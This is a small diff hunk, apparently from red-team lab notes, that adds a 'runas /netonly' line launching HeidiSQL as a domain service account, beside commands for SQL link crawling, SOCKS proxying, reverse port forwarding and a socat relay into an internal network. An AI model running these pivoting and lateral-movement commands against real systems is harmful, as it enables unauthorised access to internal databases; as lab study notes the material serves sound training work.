@@ -40,5 +40,6 @@ powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query '
 socks 1080
 rportfwd 8080 10.8.0.6 80
 proxychains socat TCP4-Listen:1433,fork TCP:192.168.1.199:1433
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 ```
 
